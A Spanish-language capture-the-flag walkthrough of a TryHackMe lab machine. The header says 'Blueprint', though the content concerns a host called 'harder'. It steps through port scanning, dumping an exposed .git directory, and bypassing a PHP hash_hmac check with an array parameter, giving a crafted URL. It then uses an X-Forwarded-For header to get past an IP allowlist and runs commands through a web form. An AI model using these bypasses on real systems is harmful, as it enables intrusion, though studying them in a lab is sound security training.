## TryHackMe  <> Blueprint

![image](https://github.com/Esevka/CTF/assets/139042999/3ea2cca3-c8e7-4fcf-84d8-2d880db182e5)

Enunciado Informacion : There is a second way to get root access without using any key

---
---

## Escaneo de puertos

Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido, por proximidad al valor 64(LINUX) podriamos decir que es una maquina Linux.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/nmap]
    └─# ping 10.10.54.78 -c1
    PING 10.10.54.78 (10.10.54.78) 56(84) bytes of data.
    64 bytes from 10.10.54.78: icmp_seq=1 ttl=63 time=73.5 ms
    
    --- 10.10.54.78 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 73.542/73.542/73.542/0.000 ms

Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo.)

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.54.78 -vvv -oN open_ports                  
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 13:03 CEST
    Initiating SYN Stealth Scan at 13:03
    Scanning 10.10.54.78 [65535 ports]
    Discovered open port 22/tcp on 10.10.54.78
    Discovered open port 80/tcp on 10.10.54.78
    Completed SYN Stealth Scan at 13:04, 24.15s elapsed (65535 total ports)
    Nmap scan report for 10.10.54.78
    Host is up, received user-set (0.068s latency).
    Scanned at 2023-07-26 13:03:57 CEST for 24s
    Not shown: 41750 closed tcp ports (reset), 23783 filtered tcp ports (no-response)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 62
    80/tcp open  http    syn-ack ttl 62
    
    Read data files from: /usr/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 24.26 seconds
               Raw packets sent: 117285 (5.161MB) | Rcvd: 48663 (1.947MB)


    ┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/nmap]
    └─# nmap -p 22,80 -sCV 10.10.54.78 -vvv -oN info_ports                        
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 13:07 CEST

    PORT   STATE SERVICE REASON         VERSION
    22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.3 (protocol 2.0)
    | ssh-hostkey: 
    |   4096 cfe2d927d2d9f3f78e5dd2f99da4fb66 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCns4FcsZGpefUl1pFm7KRPBXz7nIQ590yiEd6aNm6DEKKVQOUUT4TtSEpCaUhnDU/+XHFBJfXdm73tzEwCgN7fyxmXSCWDWu1tC1zui3CA/sr/g5k+Az0u1yTvoc3eUSByeGvVyShubpuCB5Mwa2YZJxiHu/WzFrtDbGIGiVcQgLJTXdXE+aK7hbsx6T9HMJpKEnneRvLY4WT6ZNjw8kfp6oHMFvz/lnDffyWMNxn9biQ/pSkZHOsBzLcAfAYXIp6710byAWGwuZL2/d6Yq1jyLY3bic6R7HGVWEX6VDcrxAeED8uNHF8kPqh46dFkyHekOOye6TnALXMZ/uo3GSvrJd1OWx2kZ1uPJWOl2bKj1aVKKsLgAsmrrRtG1KWrZZDqpxm/iUerlJzAl3YdLxyqXnQXvcBNHR6nc4js+bJwTPleuCOUVvkS1QWkljSDzJ878AKBDBxVLcFI0vCiIyUm065lhgTiPf0+v4Et4IQ7PlAZLjQGlttKeaI54MZQPM53JPdVqASlVTChX7689Wm94//boX4/YlyWJ0EWz/a0yrwifFK/fHJWXYtQiQQI02gPzafIy7zI6bO3N7CCkWdTbBPmX+zvw9QcjCxaq1T+L/v04oi0K1StQlCUTE12M4fMeO/HfAQYCRm6tfue2BlAriIomF++Bh4yO73z3YeNuQ==
    |   256 1e457b0ab5aa87e61bb1b79f5d8f8570 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB+INGLWU0nf9OkPJkFoW9Gx2tdNEjLVXHrtZg17ALjH
    80/tcp open  http    syn-ack ttl 62 nginx 1.18.0
    |_http-server-header: nginx/1.18.0
    | http-methods: 
    |_  Supported Methods: GET HEAD POST
    |_http-title: Error
    
## Analisis de puertos y servicios

Empezamos fuzzeando el puerto 80
        
    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
    └─# gobuster dir -u http://10.10.54.78/ -w /usr/share/wordlists/dirb/common.txt -o fuzz --exclude-length 1985

    /.git/HEAD            (Status: 403) [Size: 153]
    /phpinfo.php          (Status: 200) [Size: 86507]
    /vendor               (Status: 301) [Size: 169] [--> http://10.10.54.78:8080/vendor/]


    /.git el cual podriamos hacer un dump de dicha carpeta pero no tenemos acceso al recurso --> http status 403
    
    /phpinfo.php nos muestra el tipico phpinfo donde podemos ver toda la configuracion del php, Interesante lo dejamos de mommento.
    
    /vendor este directorio nos hace una redireccion al puerto 8080 tiene un http status 301



Con burpsuite vamos a interceptar la conexion para ver las respuesta del servidor y ver si encontramos algo.

![image](https://github.com/Esevka/CTF/assets/139042999/4ebb3396-b12a-4c44-8487-ffcc249756f9)

Como vemos en la imagen la variable Set-Cookie muestra datos interesantes, anadimos el dominio a nuestro fichero hosts para que nos realize la resolucion del dominio y ver si a traves de virtual hosting nos muestra cositas diferentes la web.

TestCookie=just+a+test+cookie
domain=pwd.harder.local

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
    └─# cat /etc/hosts

    10.10.54.78     pwd.harder.local

Accedermos a la web

![image](https://github.com/Esevka/CTF/assets/139042999/1fc66d1c-a925-4138-bc7b-fc1e04fe13dc)

![image](https://github.com/Esevka/CTF/assets/139042999/a912ced3-8d0a-4a43-ae25-a5b73d44c7c6)

Despues de revisar el codigo de la web y probar varias credenciales por defecto(admin:admin,admin:1234 ...) lo unico que conseguimos es el siguiente mensaje, el cual ya no nos permite volver a cargar el login.

	extra security in place. our source code will be reviewed soon ...

Por lo que vamos a fuzzear el dominio en busca de directorios.

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
    └─# gobuster dir -u http://pwd.harder.local/ -w /usr/share/wordlists/dirb/common.txt -o fuzz_dominio  
 
    /.git/HEAD            (Status: 200) [Size: 23]
    /index.php            (Status: 200) [Size: 19926]

Como vemos el directorio /.git que antes no teniamos acceso, a traves del dominio nos entrega un http status 200 por lo que tenemos acceso a el y podemos realizar un dumpeo.


Para dumpear el directorio /.git vamos a utlizar la herramienta git-dumper. Enlace --> https://github.com/arthaud/git-dumper

    ┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
    └─# git-dumper http://pwd.harder.local/.git/ dump_git                                            
    [-] Testing http://pwd.harder.local/.git/HEAD [200]
    [-] Testing http://pwd.harder.local/.git/ [403]
    [-] Fetching common files
    ...

Ficheros obtenidos despues del dumpeo.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/harder/dump_git]
    └─# ls
    auth.php  hmac.php  index.php

Analizamos los ficheros, estos tres ficheros son los encargador del panel de login encontrado anteriormente.

    index.php --> require (auth.php,hmac.php y credentials.php), el fichero credentials.php no lo tenemos.

	auth.php --> es el fichero que procesa todo. el formulario de login.

	hmac.php --> este fichero es el interesante lo podemos bypasear, utiliza una funciona hash_hmac.

Enlace funcion hash_mac --> https://www.php.net/manual/es/function.hash-hmac.php)


## Explotando/Bypass funcion hash_mac PHP

Fichero hmac.php, lo esplicaremos por secciones.

	<?php
		(1)
		 if (empty($_GET['h']) || empty($_GET['host'])) 
		 {
			header('HTTP/1.0 400 Bad Request');
			print("missing get parameter");
			die();
		}
		require("secret.php"); //set $secret var
		
		(2)
		if (isset($_GET['n'])) 
		{
			$secret = hash_hmac('sha256', $_GET['n'], $secret);
		}
		
		$hm = hash_hmac('sha256', $_GET['host'], $secret);
		
		(3)
		if ($hm !== $_GET['h'])
		{
			header('HTTP/1.0 403 Forbidden');
			print("extra security check failed");
			die();
		}
	?>

 (1) if --> comprueba si las variables h o host estan vacias, por lo que son necesarias en nuestra url si  queremos saltar el primer if.
 	Si enviamos las variables vacias entraremos en el if como nos muestra el ejemplo.
 
 	http://pwd.harder.local/index.php?h=''&host=''
  
![image](https://github.com/Esevka/CTF/assets/139042999/ab0be6a5-dc8b-453f-8f92-f0b722ce1f49)

(2) if --> comprueba que existe la variable n, para almacenar el resultado de la funcion hash_mac en la variable $secrets, que posteriormente sera utilizada en el (3)if como key de la funcion hash_mac, por lo que nuestra url debe tener la variable n tambien.

	http://pwd.harder.local/index.php?h=''&host=''&n=''

Estructura funcion hash_mac ---> hash_hmac(algoritmo,data,key)

	algoritmo	-> algoritmo para cifrar.
	data		-> Mensaje para cifrar.
	key 		-> Clave secreta compartida que se usará para generar el mensaje cifrado.

			
(3) if --> comprueba que tanto la variable $hm(resultado de la funciona hash_mac donde utiliza domo data la variable host y como key la variable $secret resultado de la funciona hach_mac del (2) if),como la varialbe h que pasamos por la url sean iguales tanto en tipo como en valor.

Explicacion del bypass.

 -En la funciona hash_mac la data que espera debe ser string, pero si le pasamos en vez de un string un array de datos esta funcion se rompe devolviendo como resultado ===false===, por lo que nuestra 	variable $secret=false, controlando esta variable que es la key  y la variable host que la introducimos nosotros podremos bypasear la funciona

	 $hm = hash_hmac('sha256', $_GET['host'], $secret);
		
		if ($hm !== $_GET['h'])
			

Info Bypass--> https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up/

Preparamos nuestra carga

	Valor que que introduciremos en la variable h

		<?php
			echo hash_hmac('sha256','esevka',false);
		?>

		h=c36f9d28c5f2b9f77d47e6862f1b8af43a50ae3c0b2a20c235032bf4b03bf2c9

Url modificada para bypasear la funcion

		http://pwd.harder.local/index.php?h=c36f9d28c5f2b9f77d47e6862f1b8af43a50ae3c0b2a20c235032bf4b03bf2c9&host=esevka&n[]=

Al ejecutar la url, la web nos devulve un resultado muy interesante.

	url 				username 	password (cleartext)
	http://shell.harder.local 	evs 		9FRe8VUuh----Wn0e9RfSGv7xm

## Explotando Nuevo dominio encontrado.

Anadimos dicho dominio encontrado a nuestro fichero /etc/hosts.

	┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
	└─# cat /etc/hosts                                                  
	10.10.29.10     pwd.harder.local shell.harder.local

Accedemos a la url y nos logueamos con las credenciales que hemos encontrado.
 
	http://shell.harder.local

![image](https://github.com/Esevka/CTF/assets/139042999/23ce76ce-d482-4827-87aa-11632e7bbeee)

Obtenemos el siguiente mensaje de la web una vez logueados.

	Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed

Como nos dice que solo estan permitidas las ips 10.10.10.xx, vamos a hacer uso de burpsuite  para interceptar la request y modificar la cabecera de esta anadiendole el valor X-Forwarded-For con una ip valida y ver si podemos saltarnos esta prohibicion.

	 La cabecera X-Forwarded-For (XFF) es un estándar para identificar el origen de la dirección IP de un cliente conectado a un servidor web a través de un proxy HTTP o un balanceador de carga.
	
![image](https://github.com/Esevka/CTF/assets/139042999/2626e33e-bd2d-41fc-b4e7-ce90378d507d)

Esto nos permite poder visualizar la pagina correctamente, mostrandonos un form que nos permite ejecutar comandos del sistema RCE.

	<form method="POST">
		<div class="form-group">
			<label for="cmd"><strong>Command</strong></label>
			<input type="text" class="form-control" name="cmd" id="cmd" value="" required>                
		</div>
		<button type="submit" class="btn btn-primary">Execute</button>
        </form>

Analizamos el form y vemos que mediante el metodo POST envia una variable cmd que es igualada al comando que queremos ejecutar, editamos la request para poder ejecutar comandos.

![image](https://github.com/Esevka/CTF/assets/139042999/4d122698-0e14-4bb2-bc14-449ceb54227b)

Hemos conseguido ejecutar comandos en la maquina victima, response de nuestra request modificada.

	       <div class="pb-2 mt-4 mb-2">
            		<h2> Output </h2>
        	</div>
        	<pre>
			auth.php
			index.php
			ip.php
			vendor
        	</pre>



